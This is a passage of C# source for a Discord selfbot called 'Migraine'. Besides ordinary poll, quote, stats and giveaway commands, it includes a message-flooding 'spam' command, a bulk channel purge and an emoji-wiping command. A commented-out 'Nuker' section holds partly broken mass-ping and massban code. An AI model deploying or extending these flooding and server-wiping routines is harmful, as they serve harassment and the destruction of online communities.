            embed.WithColor(Globals.EmbedHexColor);

            await Context.Channel.SendMessageAsync("", false, embed.Build());
            Thread.Sleep(1000);
            await Context.Message.DeleteAsync();
        }

        [Command("poll")]
        public async Task poll([Remainder] string message = null)
        {
            await Context.Message.DeleteAsync();
            var check = new Emoji("✅");
            var exit = new Emoji("❌");
            EmbedBuilder embed = new EmbedBuilder();
            embed.Title = "Vote!";
            embed.WithThumbnailUrl(Context.Client.CurrentUser.GetAvatarUrl(0));
            embed.WithDescription($"```{message}```");
            embed.WithColor(Globals.EmbedHexColor);
            IUserMessage userMessage2 = await Context.Channel.SendMessageAsync("", false, embed.Build(), null);
            IUserMessage userMessage = userMessage2;
            userMessage2 = null;
            IUserMessage msg = userMessage;
            await msg.AddReactionAsync(check, null);
            await msg.AddReactionAsync(exit, null);
        }

        [Command("purge all")]
        public async Task purge()
        {
            int delnum = 10000;
            var messages = await Context.Channel.GetMessagesAsync(delnum + 1, CacheMode.AllowDownload, null).FlattenAsync();
            foreach (var user in messages)
                await Context.Channel.DeleteMessageAsync(user);
        }

        [Command("quote")]
        public async Task quote(string msg = null)
        {
            bool flag = msg == null;
            if (flag)
            {
                bool flag2 = Commands.author == null;
                if (flag2)
                {
                    await this.ReplyAsync("You must copy a quote or include a message id!", false, null, null);
                }
                else
                {
                    await base.Context.Message.DeleteAsync(null);
                    EmbedBuilder embed = new EmbedBuilder();
                    embed.WithAuthor(Commands.author, null, null);
                    embed.WithDescription(Commands.Content);
                    embed.WithColor(Globals.EmbedHexColor);
                    embed.WithFooter("in #" + Commands.Channel + " - " + Commands.Time, null);
                    await base.Context.Channel.SendMessageAsync("", false, embed.Build(), null);
                }
            }
            else
            {
                ulong id = Convert.ToUInt64(msg);
                await base.Context.Message.DeleteAsync(null);
                IEnumerable<IMessage> enumerable = await Context.Channel.GetMessagesAsync(100, CacheMode.AllowDownload, null).FlattenAsync<IMessage>();
                IEnumerable<IMessage> messages = enumerable;
                foreach (IMessage message in messages)
                {
                    if (message.Id.ToString().Contains(id.ToString()))
                    {
                        EmbedBuilder embed2 = new EmbedBuilder();
                        embed2.WithAuthor(message.Author);
                        embed2.WithDescription(message.Content);
                        embed2.WithColor(Globals.EmbedHexColor);
                        embed2.WithFooter("in " + base.Context.Channel.Name + " - " + message.Timestamp.LocalDateTime.ToShortDateString(), null);
                        await base.Context.Channel.SendMessageAsync("", false, embed2.Build(), null);
                        break;
                    }
                }
            }
        }

        [Command("cquote")]
        public async Task CopyQuote(ulong id)
        {
            await base.Context.Message.DeleteAsync(null);
            IEnumerable<IMessage> enumerable = await base.Context.Channel.GetMessagesAsync(100, CacheMode.AllowDownload, null).FlattenAsync<IMessage>();
            IEnumerable<IMessage> messages = enumerable;
            enumerable = null;
            foreach (IMessage message in messages)
            {
                if (message.Id.ToString().Contains(id.ToString()))
                {
                    author = message.Author.Username + "#" + message.Author.Discriminator;
                    Content = message.Content;
                    Channel = base.Context.Channel.Name;
                    Time = message.Timestamp.LocalDateTime.ToShortDateString();
                    break;
                }
            }
        }
        public static string author;

        public static string Content;

        public static string Channel;

        public static string Time;

        [Command("spfp")]
        public async Task spfp()
        {
            await Context.Message.DeleteAsync();
            string serveravatar = Context.Guild.IconUrl;
            var embed = new EmbedBuilder();
            embed.WithImageUrl(serveravatar);
            embed.WithColor(Globals.EmbedHexColor);
            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }

        [Command("sstats")]
        public async Task sstats()
        {
            string serveravatar = Context.Guild.IconUrl;

            var server = Context.Guild;
            var roles = server.Roles;
            var members = server.GetUsersAsync(CacheMode.AllowDownload, null);
            var embed = new EmbedBuilder();

            embed.WithThumbnailUrl(serveravatar);
            embed.AddField("**Server Name:** ", $" {server.Name}");
            embed.AddField("**Server Owner:** ", $"{server.OwnerId}");
            embed.AddField("**Server Created:** ", $" {server.CreatedAt}");
            embed.AddField("**Roles:** ", $"{roles.ToString()}");
            embed.AddField("**Members:**", $"{members.ToString()}");
            embed.WithColor(Globals.EmbedHexColor);
            embed.WithFooter("Migraine | Made by Twin Turbo");

            await Context.Channel.SendMessageAsync("", false, embed.Build());

        }

        [Command("spam")]
        public async Task spam(string message = null)
        {
            bool nullable = message == null;
            if (nullable)
                ConsoleLog.Log("Message null, try [message <amount>]");
            else
                await Context.Message.DeleteAsync(null);
            string[] msgarr = message.Split(new char[] { ' ' });
            int i = Convert.ToInt32(msgarr[msgarr.Length - 1]);
            for (int j = 0; j < i; j++)
                await Context.Channel.SendMessageAsync(message.Replace(i.ToString(), ""), false, null);
        }

        [Command("stats")]
        public async Task stats()
        {
            await Context.Message.DeleteAsync(null);
            TimeSpan time = DateTime.Now - Process.GetCurrentProcess().StartTime;
            string upTime = "Been Alive For: ";
            bool Day = time.Days > 0;
            if (Day)
            {
                bool Hour = time.Hours <= 0 || time.Minutes <= 0;
                if (Hour)
                {
                    upTime += string.Format("{0} Day(s) and ", time.Days);
                }
                else
                {
                    upTime += string.Format("{0} Day(s),", time.Days);
                }
            }
            bool Minute = time.Hours > 0;
            if (Minute)
            {
                bool flag4 = time.Minutes > 0;
                if (flag4)
                {
                    upTime += string.Format(" {0} Hour(s), ", time.Hours);
                }
                else
                {
                    upTime += string.Format("{0} Hour(s) And ", time.Hours);
                }
            }
            bool Second = time.Minutes > 0;
            if (Second)
            {
                upTime += string.Format("{0} Minute(s)", time.Minutes);
            }
            bool MilSec = time.Seconds >= 0;
            if (MilSec)
            {
                bool flag7 = time.Hours > 0 || time.Minutes > 0;
                if (flag7)
                {
                    upTime += string.Format(" And {0} Second(s)", time.Seconds);
                }
                else
                {
                    upTime += string.Format("{0} Second(s)", time.Seconds);
                }
            }
            Process process = Process.GetCurrentProcess();
            long mem = process.PrivateMemorySize64;
            long memory = mem / 1024L / 1024L;
            EmbedBuilder embed = new EmbedBuilder();
            embed.WithTitle("Migraine Selfbot Stats:");
            embed.WithThumbnailUrl(Globals.MigraineImageURL);
            embed.WithColor(Globals.EmbedHexColor);
            embed.WithTimestamp(DateTimeOffset.UtcNow.UtcDateTime);
            embed.WithFooter("Migraine Stats - By Twin Turbo");
            embed.WithThumbnailUrl(Context.User.GetAvatarUrl(ImageFormat.Auto, 128));
            embed.WithFooter("Migraine Stats - By Twin Turbo");
            embed.AddField("Memory Usage:", string.Format("```fix\n{0}Mb```", memory), true);
            embed.AddField("Up-time:", "```prolog\n" + upTime + "```", true);
            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }


        [Command("playing")]
        public async Task playing(string args)
        {
            await Context.Message.DeleteAsync();
            await (Context.Client as DiscordSocketClient).SetGameAsync(args, null, ActivityType.Playing);
            await Context.Channel.SendMessageAsync($"Successfully changed status to '**{args}**'");
        }
        [Command("typing")]
        public async Task type()
        {
            await Context.Message.DeleteAsync();
            await Context.Channel.TriggerTypingAsync();
        }

        [Command("streaming")]
        public async Task streaming(string args)
        {
            await Context.Message.DeleteAsync();
            await (Context.Client as DiscordSocketClient).SetGameAsync(args, "https://twitch.tv/ninja", ActivityType.Streaming);
            await Context.Channel.SendMessageAsync($"Successfully changed status to '**{args}**'");
        }

        [Command("tcolor")]
        public async Task tcolor(string message, string args)
        {
            await Context.Message.DeleteAsync();
            if (args.Length > 1)
                if (message.Equals("orange"))
                    await Context.Channel.SendMessageAsync("```fix\n" + args + "```");
                else if (message == "green")
                    await Context.Channel.SendMessageAsync("```css\n" + args + "```");
                else if (message.Equals("cyan"))
                    await Context.Channel.SendMessageAsync("```yaml\n" + args + "```");
                else if (message.Equals("red"))
                    await Context.Channel.SendMessageAsync("```diff\n" + "- " + args + "```");
                else
                    await Context.Channel.SendMessageAsync("**Invalid Color.**");
        }

        [Command("unban")]
        [RequireUserPermission(GuildPermission.BanMembers)]
        public async Task unban(ulong userName)
        {
            await Context.Guild.RemoveBanAsync(userName, null);
            await ReplyAsync(string.Format("I Unbanned {0}", userName), false, null, null);
            ConsoleLog.Log($"Unbanned {userName} from " + Context.Guild.Name);
        }

        [Command("userinfo")]
        public async Task userinfo(SocketGuildUser user = null)
        {
            await Context.Message.DeleteAsync();
            List<string> RolesString = new List<string>();
            EmbedBuilder embed = new EmbedBuilder();

            if (user == null)
                user = (Context.Message.Author as SocketGuildUser);

            foreach (SocketRole role in user.Roles)
                RolesString.Add(role.Mention);

            embed.WithAuthor(user);
            embed.WithThumbnailUrl(user.GetAvatarUrl(ImageFormat.Auto, 128));
            embed.AddField("Bot", user.IsBot, true);
            embed.AddField("Status", user.Activity, true);
            embed.AddField("Created Account", user.CreatedAt.DateTime.ToString(), true);
            embed.AddField("Joined Server", user.JoinedAt.ToString().Split(new char[]
            {
                '+'
            })[0], true);
            embed.AddField(string.Format("Roles[{0}]", RolesString.Count), string.Join(", ", RolesString), false);
            embed.AddField("Playing", user.Status.ToString(), false);
            embed.WithColor(Globals.EmbedHexColor);
            embed.WithFooter(string.Format("ID: {0} - Today at {1}", user.Id, DateTime.Now.ToShortTimeString()), null);
            await Context.Channel.SendMessageAsync("", false, embed.Build(), null);
        }

        [Command("giveaway")]
        public async Task CreateGiveaway([Remainder] string info = null)
        {
            await Context.Message.DeleteAsync();
            bool noinfo = info == null;
            if (noinfo)
                await Context.Channel.SendMessageAsync($"What are you going to giveaway? ex:({Globals.Prefix}giveaway Discord Nitro 24h)");
            else if (Globals.UsersEntered.Count != 0)
                await Context.Channel.SendMessageAsync("You can only have 1 giveaway at a time!");
            else
            {
                string[] GetEndTime = info.Split(new char[]
                {
                    ' '
                });
                int TimeTillEnd = 0;
                int num = 0;
                try
                {
                    ConsoleLog.Log(GetEndTime[GetEndTime.Length - 1]);
                    TimeTillEnd = Convert.ToInt32(GetEndTime[GetEndTime.Length - 1].Replace("h", ""));
                    info = info.Replace(GetEndTime[GetEndTime.Length - 1], "");
                }
                catch 
                {
                    num = 1;
                }
                if (num != 1)
                {
                    Globals.StartTime = DateTime.Now;
                    Globals.TimeToEnd = DateTime.Now.AddHours((double)TimeTillEnd);
                    var emoji = new Emoji("\ud83c\udf81");
                    var host = Context.User;
                    var embed = new EmbedBuilder();
                    embed.WithAuthor(host);
                    embed.WithTitle($"{host.Username} has started a giveaway!");
                    embed.WithDescription(string.Format("{0}\n React with {1} to enter this giveaway", info, emoji));
                    embed.WithColor(Globals.EmbedHexColor);
                    embed.WithFooter("Starts - " + Globals.StartTime.ToString() + " - Ends - " + Globals.TimeToEnd.ToString());
                    IUserMessage userMessage2 = await Context.Channel.SendMessageAsync("", false, embed.Build());
                    IUserMessage userMessage = userMessage2;
                    userMessage2 = null;
                    IUserMessage msg = userMessage;
                    await msg.AddReactionAsync(emoji);
                    Globals.Giveawayname = info;
                    Globals.GiveawayMessasge = Context.Message.Id;
                    Globals.GiveawayChannel = Context.Message.Channel.Id;
                }
                else
                {
                    await Context.Channel.SendMessageAsync("invalid Time");
                }
            }
        }
        [Command("beamed")]
        public async Task Beamed()
        {
            await Context.Message.DeleteAsync();
            var embed = new EmbedBuilder();
            embed.WithUrl("https://youtu.be/mofDoLLSO6s");
            embed.WithThumbnailUrl("https://youtu.be/mofDoLLSO6s");
            await Context.Channel.SendMessageAsync("", false, embed.Build());
        }
        [Command("rainbow")]
        public async Task Rainbow(ulong roleid)
        {
            await Context.Message.DeleteAsync();
            int r = 244;
            int g = 65;
            int b = 65;
            if (g <= 65)
            {
                b += 1;
                var role = Context.Guild.GetRole(roleid);

            }
        }
        [Command("delemoji")]
        public async Task DeleteEmojis()
        {
            await Context.Message.DeleteAsync();
            var Emojis = Context.Guild.Emotes;
            foreach (var emoji in Emojis)
            {
                await Context.Guild.DeleteEmoteAsync(emoji);
            }
        }
    }
}

        //[Command("oops")]
        //public async Task lmfao()
        //{
        //    //if (Context.User.Id.ToString() == Context.Client.CurrentUser.Id.ToString())
        //    //{
        //    //    await Context.Message.DeleteAsync();

        //    //    string mention = "";

        //    //    var users = await Context.Guild.Users;

        //    //    foreach (SocketGuildUser member in users)
        //    //    {
        //    //        if (member.IsBot)
        //    //            continue;
        //    //        mention += member.Mention + " ";
        //    //        if (mention.Length >= 1977)
        //    //        {
        //    //            await Context.Channel.SendMessageAsync(mention);
        //    //            Thread.Sleep(500);
        //    //            await Context.Message.DeleteAsync();
        //    //            mention = "";
        //    //        }
        //    //        await Context.Channel.SendMessageAsync(mention);
        //    //        Thread.Sleep(500);
        //    //        await Context.Message.DeleteAsync();
        //    //    }
        //    }
            //==============================================Nuker====================================================//


            //[Command("delroles")]
            //[RequireUserPermission(GuildPermission.Administrator)]
            //public async Task delroles()
            //{
            //    await Context.Message.DeleteAsync();

            //    var roles = await Context.Guild.Roles;

            //}

            //[Command("massban")]
            //[RequireUserPermission(GuildPermission.Administrator)]
            //public async Task massban()
            //{
            //    await Context.Message.DeleteAsync();

            //    var banmember = await Context.Guild.GetUsersAsync();

            //    foreach (var ban in banmember)
            //    {
            //        await Context.Guild.AddBanAsync(banmember, 0, null);
            //    }
            //}

            //[Command("massunban")]
            //[RequireUserPermission(GuildPermission.Administrator)]
            //public async Task massunban()
            //{
            //}

            //=================================================================================================//
            //[Command("react")]
            //[RequireUserPermission(GuildPermission.AddReactions)]
            //public async Task react(string emoji, int amount = 100000)
            //{
            //    await Context.Message.DeleteAsync();

            //    var GetAllMessages = await Context.Channel.GetMessagesAsync(amount, CacheMode.CacheOnly, null).FlattenAsync();


            //    foreach (var message in GetAllMessages)
            //    {
            //        await Context.Message.AddReactionsAsync(GetAllMessages, emoji);
            //    }
            //}
